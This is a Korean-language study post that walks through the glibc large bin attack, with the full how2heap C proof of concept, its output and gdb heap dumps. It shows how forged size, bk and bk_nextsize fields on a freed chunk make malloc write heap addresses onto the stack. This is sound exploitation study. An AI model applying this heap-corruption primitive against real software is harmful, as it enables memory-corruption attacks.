---
title: Large Bin Attack
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, large bin]
math: true
mermaid: true
---

## Description

writing a large unsigned long value into stack.

## Exploit plan

1. 지역 변수 생성(stack_var1, stack_var2)
2. p1, p2, p3 3개의 large chunk 할당
3. p1, p2 연속적으로 free
4. p1보다 작은 size로 malloc(0x90), p2는 largebin freelist에 할당
5. p3 free 함으로써 p3가 unsorted bin에 할당됨
6. p2의 size, bk, bk_nextsize 변조
    - size : 0x3f1
    - bk : &stack_var - 0x10
    - bk_nextsize : &stack_var - 0x20
7. 다시 malloc(0x90) 시 stack_var1, stack_var2의 값은 unsigned long value로 변조

## Proof of concept

```c
/*
    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
    [...]
              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim; <- 
              }
              bck = fwd->bk;
    [...]
    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim; <-    
    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.
    [...]
 */

#include<stdio.h>
#include<stdlib.h>
 
int main()
{
    fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.\n");
    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x320);
    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x400);
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x400);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
 
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           " the third large chunk during the free()\n\n");
    malloc(0x20);
 
    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

    malloc(0x90);
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
 
    //------------VULNERABILITY-----------

    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);
 
    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    return 0;
}
```

stack_var1, stack_var2

```
This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.
This file demonstrates large bin attack by writing a large unsigned long value into stack
In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbinattack
Let's first look at the targets we want to rewrite on stack:
stack_var1 (0x7fffffffe310): 0
stack_var2 (0x7fffffffe318): 0
Now, we allocate the first large chunk on the heap at: 0x603000
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()
Then, we allocate the second large chunk on the heap at: 0x603360
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()
Finally, we allocate the third large chunk on the heap at: 0x6037a0
And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()
```

3개의 large chunk malloc 후 heap 상태

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x603000            0x0                 0x330                Used                None              None
0x603330            0x0                 0x30                 Used                None              None
0x603360            0x0                 0x410                Used                None              None
0x603770            0x0                 0x30                 Used                None              None
0x6037a0            0x0                 0x410                Used                None              None
0x603bb0            0x0                 0x30                 Used                None              None
```

p1, p2 free하여 unsorted bin에 p1, p2가 할당된다.

```
We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x603360 <--> 0x603000 ]
```

```
              top: 0x603be0 (size : 0x20420) 
       last_remainder: 0x0 (size : 0x0) 
       unsortbin: 0x603360 (size : 0x410) <--> 0x603000 (size : 0x330)
```

p1보다 작은 size로 malloc 시 첫 번째 large chunk(0x603000)에서 할당한다. 다시 malloc(0x90) 함으로써 p2가 largebin freelist로 할당된다.

```
Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, usepartsof the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x6030a0 ]
```

새로 할당된 heap(0x603000)

```
addr                prev                size                 status              fd                bk                
0x603000            0x0                 0xa0                 Used                None              None
0x6030a0            0x0                 0x290                Freed     0x7ffff7dd1b78    0x7ffff7dd1b78
```

p2는 largebin freelist에 할당한다.

```
              top: 0x603be0 (size : 0x20420) 
       last_remainder: 0x6030a0 (size : 0x290) 
       unsortbin: 0x6030a0 (size : 0x290)
       largebin[ 0]: 0x603360 (size : 0x410)
```

p3(0x6037a0) free 시 unsorted bin에 할당된다.

```
Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x6037a0 <--> 0x6030a0 ]
```

```
              top: 0x603be0 (size : 0x20420) 
       last_remainder: 0x6030a0 (size : 0x290) 
       unsortbin: 0x6037a0 (size : 0x410) <--> 0x6030a0 (size : 0x290)
       largebin[ 0]: 0x603360 (size : 0x410)
```

bk에 stack_var1(0x00007fffffffe310) - 0x10 한 값으로 변조하고, bk_nextsize에 stack_var2(0x00007fffffffe318) - 0x20 한 값으로 변조한다.

```
Now emulating a vulnerability that can overwrite the freed second large chunk's "size" as well as its "bk" and "bk_nextsize" pointers
Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large binfreelist. Tooverwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2
```

p2 변조 후 메모리

```
gdb-peda$ x/24gx 0x603360
0x603360:   0x0000000000000000  0x00000000000003f1
0x603370:   0x0000000000000000  0x00007fffffffe300
0x603380:   0x0000000000000000  0x00007fffffffe2f8
```

malloc(0x90) 시 stack_var1, stack_var2가 unsigned long value로 변조한다.

```
Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
stack_var1 (0x7fffffffe310): 0x6037a0
stack_var2 (0x7fffffffe318): 0x6037a0
```

stack_var1, stack_var2 메모리

```
gdb-peda$ x/2gx 0x00007fffffffe310
0x7fffffffe310: 0x00000000006037a0  0x00000000006037a0
```

## References

- [_int_malloc 함수 분석 (1)](https://youngsouk-hack.tistory.com/43)
- [large_bin_attack.c](https://github.com/beomsu317/how2heap/blob/master/glibc_2.26/large_bin_attack.c)
- [Extra Heap Exploitation 3: A Revisit to Large Bin in Glibc](https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/)